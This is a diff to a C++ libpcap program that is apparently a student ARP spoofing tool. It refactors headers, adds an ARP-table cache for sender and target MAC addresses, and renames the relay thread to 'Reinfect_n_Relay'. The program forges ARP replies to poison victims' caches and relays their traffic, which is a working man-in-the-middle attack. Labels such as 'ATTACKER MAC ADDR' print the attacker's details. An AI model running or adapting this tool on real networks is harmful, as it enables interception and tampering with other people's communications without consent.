@@ -1,25 +1,4 @@
-#include <cstdio>
-#include <pcap.h>
-#include "ethhdr.h"
-#include "arphdr.h"
-#include "iphdr.h"
-
-#include <stdio.h>
-#include <unistd.h>
-#include <string.h>
-
-#include <sys/socket.h>
-#include <sys/ioctl.h>
-#include <netinet/in.h>
-#include <net/if.h>
-#include <arpa/inet.h>
-#include <netinet/ether.h>
-
-#include <signal.h>
-#include <thread>
-
-#include <list>
-#include <map>
+#include "headers.h"
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -47,8 +26,6 @@ struct FlowInfo final {
 };
 #pragma pack(pop)
 
-std::list<FlowInfo> flows;
-std::map<Ip, Mac> arpTable;
 
 void signal_handler (int sig);
 void GetMyInfo(Ip* myIp, Mac* myMac, char* dev);
@@ -57,9 +34,12 @@ EthArpPacket MakeArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac,
 void SendArpPacket(pcap_t* handle, EthArpPacket packet);
 void SendIpPacket(pcap_t* handle, EthIpPacket packet, int size);
 void Infect(pcap_t *handle);
-void Relay(pcap_t* handle);
+void Reinfect_n_Relay(pcap_t* handle);
 
 bool runThread = true;
+
+
+std::list<FlowInfo> flows;
 
 
 void usage() {
@@ -69,7 +49,7 @@ void usage() {
 
 void signal_handler (int sig)
 {
-    printf("Interrupt Executed : %d\n",sig);
+    printf("\nInterrupt Executed : %d\n",sig);
     runThread = false;
 	exit(sig);
 }
@@ -118,13 +98,15 @@ Mac GetMac_ByIp(pcap_t* handle, Ip myIp, Mac myMac, Ip Ip){
 		EthArpPacket* resPacket;
 
 		resPacket = (struct EthArpPacket *)replyPacket;
-		if(resPacket->arp_.sip() == Ip && resPacket->arp_.tip() == myIp){
-			mac = Mac((uint8_t*)(resPacket->arp_.smac_));
-			return mac;
+		if(resPacket->eth_.type() == EthHdr::Arp){
+			if(resPacket->arp_.sip() == Ip && resPacket->arp_.tip() == myIp){
+				mac = Mac((uint8_t*)(resPacket->arp_.smac_));
+				return mac;
+			}
+			else continue;
 		}
-		else continue;
 	}
-	return NULL;
+	return Mac::nullMac();
 }
 
 // mode : 0 = request, 1 = reply
@@ -177,7 +159,7 @@ void Infect(pcap_t *handle){
 	}
 }
 
-void Relay(pcap_t* handle){
+void Reinfect_n_Relay(pcap_t* handle){
 	struct pcap_pkthdr* header;
 	const u_char* replyPacket;
 	while(runThread){
@@ -228,6 +210,7 @@ int main(int argc, char* argv[]) {
 	}
 
 	char* dev = argv[1];
+	std::map<Ip, Mac> arpTable;
 
 	Ip attackerIp; 
 	Mac attackerMac;
@@ -237,7 +220,7 @@ int main(int argc, char* argv[]) {
 	GetMyInfo(&attackerIp, &attackerMac, dev);
 	printf("[ATTACKER MAC ADDR = %s]\n", std::string(attackerMac).c_str());
 	printf("[ATTACKER IP ADDR = %s]\n", std::string(attackerIp).c_str());
-	// arpTable[attackerIp] = attackerMac;
+	arpTable[attackerIp] = attackerMac;
 
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if (handle == nullptr) {
@@ -253,36 +236,24 @@ int main(int argc, char* argv[]) {
 		info.targetIp = Ip(argv[2*i+1]);
 
 		//arpTable에 senderIp에 대한 정보가 있는지 확인
-		// if(auto ret = arpTable.count(info.senderIp))
-		// 	arpTable[info.senderIp] = GetMac_ByIp(handle, attackerIp, attackerMac, info.senderIp);
-		// else
-		// 	fprintf(stderr, "couldn't get sender mac address (%s)\n",errbuf);
-	
-		// if(!arpTable.count(info.targetIp))
-		// 	arpTable[info.targetIp] = GetMac_ByIp(handle, attackerIp, attackerMac, info.targetIp);
-		// else
-		// 	fprintf(stderr, "couldn't get target mac address (%s)\n",errbuf);
+		if(!arpTable.count(info.senderIp))
+			arpTable[info.senderIp] = GetMac_ByIp(handle, attackerIp, attackerMac, info.senderIp);
+		else
+			fprintf(stderr, "couldn't get sender mac address (%s)\n",errbuf);
 
-		// Mac tmp = Mac::nullMac();
-		
-		// if(arpTable.insert({info.senderIp, tmp}).second)
-		// 	arpTable.insert({info.senderIp, GetMac_ByIp(handle, attackerIp, attackerMac, info.senderIp)});
-		// if(arpTable.insert({info.targetIp, tmp}).second)
-		// 	arpTable.insert({info.targetIp, GetMac_ByIp(handle, attackerIp, attackerMac, info.targetIp)});
-		
-		
-		// info.senderMac = arpTable[info.senderIp];
-		// info.targetMac = arpTable[flows.push_back(info);info.targetIp];
+		if(!arpTable.count(info.targetIp))
+			arpTable[info.targetIp] = GetMac_ByIp(handle, attackerIp, attackerMac, info.targetIp);
+		else
+			fprintf(stderr, "couldn't get target mac address (%s)\n",errbuf);
 
-		info.senderMac =  GetMac_ByIp(handle, attackerIp, attackerMac, info.senderIp);
-		info.targetMac =  GetMac_ByIp(handle, attackerIp, attackerMac, info.targetIp);
+		info.senderMac = arpTable[info.senderIp];
+		info.targetMac = arpTable[info.targetIp];
 
+		printf("[SENDER MAC ADDR = %s]\n", std::string(info.senderMac).c_str());
+		printf("[SENDER IP ADDR = %s]\n", std::string(info.senderIp).c_str());
 
-		printf("[SENDER MAC ADDR = %s]\n", std::string(info.senderMac).data());
-		printf("[SENDER IP ADDR = %s]\n", std::string(info.senderIp).data());
-
-		printf("[TARGET MAC ADDR = %s]\n", std::string(info.targetMac).data());
-		printf("[TARGET IP ADDR = %s]\n", std::string(info.targetIp).data());
+		printf("[TARGET MAC ADDR = %s]\n", std::string(info.targetMac).c_str());
+		printf("[TARGET IP ADDR = %s]\n", std::string(info.targetIp).c_str());
 		
 		info.infectPkt = MakeArpPacket(1, handle, info.attackerMac, info.senderMac, info.attackerMac, info.targetIp, info.senderMac, info.senderIp);
 		flows.push_back(info);
@@ -291,7 +262,7 @@ int main(int argc, char* argv[]) {
 
 	signal(SIGINT, signal_handler);
 	std::thread infect_t(Infect, handle);
-	std::thread relay_t(Relay, handle);
+	std::thread relay_t(Reinfect_n_Relay, handle);
 	
 	infect_t.join();
 	relay_t.join();
